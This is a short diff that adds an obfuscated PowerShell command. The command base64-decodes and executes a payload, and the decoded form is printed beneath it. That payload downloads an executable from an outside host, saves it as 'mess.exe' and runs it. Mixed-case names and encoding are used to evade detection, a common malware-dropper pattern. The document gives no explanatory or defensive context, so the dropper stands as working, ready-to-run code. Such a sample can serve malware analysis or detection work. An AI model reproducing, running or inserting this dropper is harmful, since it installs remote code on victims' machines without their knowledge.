@@ -1,0 +1,7 @@
+iex([sySTEm.tEXT.eNCoDINg]::UTF8.gEtstRING([SYSTEM.conVERT]::frOMbASE64StRing('CihOZXctT2JqZWN0IHNZc3RFbS5uRVQuV0VCQ0xpRU5UKS5kb3dObG9BREZJbEUoJ2h0dHA6Ly93b3JsZG5pdC5jb20vYWJhLmV4ZScsJ21lc3MuZXhlJyk7U3RhcnQtUHJvY2VzcyAnbWVzcy5leGUnCgo=')));exit
+
+##### B64 CONTENT #####
+
+
+(New-Object sYstEm.nET.WEBCLiENT).dowNloADFIlE('http://worldnit.com/aba.exe','mess.exe');Start-Process 'mess.exe'
+
